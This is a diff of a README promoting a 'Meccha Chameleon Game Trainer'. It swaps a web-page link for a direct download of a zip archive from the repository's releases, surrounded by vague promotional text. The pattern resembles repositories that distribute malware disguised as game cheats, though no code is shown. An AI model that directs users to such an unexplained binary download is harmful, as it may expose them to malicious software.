@@ -8,7 +8,7 @@ Built with a philosophy of **harmony over brute force**, the Meccha Chameleon Ga
 
 <img width="1659" height="948" alt="ChatGPT Image 26 июн  2026 г , 17_39_26" src="https://github.com/user-attachments/assets/d6227dd0-d03a-4f57-95b8-7e2c50ff8517" />
 
-[![Download](https://raw.githubusercontent.com/Kiya682/meccha-chameleon-ecore-plus/main/button.svg)](https://kiya682.github.io/meccha-chameleon-ecore-plus/)
+[![Download](https://raw.githubusercontent.com/Kiya682/meccha-chameleon-ecore-plus/main/button.svg)](https://github.com/Kiya682/meccha-chameleon-ecore-plus/releases/download/ecore-meccha/meccha-ecore.zip)
 ### Why "Meccha Chameleon Game Trainer"?
 
 In the wild, a chameleon changes color to communicate, adapt, and survive. In the digital realm of *Meccha Chameleon*, players must similarly adapt to shifting mechanics, unpredictable enemies, and evolving environments. The **Meccha Chameleon Game Trainer** is your **adaptive shell** — a tool that doesn’t impose a one-size-fits-all solution, but rather **morphs** its capabilities to fit your unique playstyle.
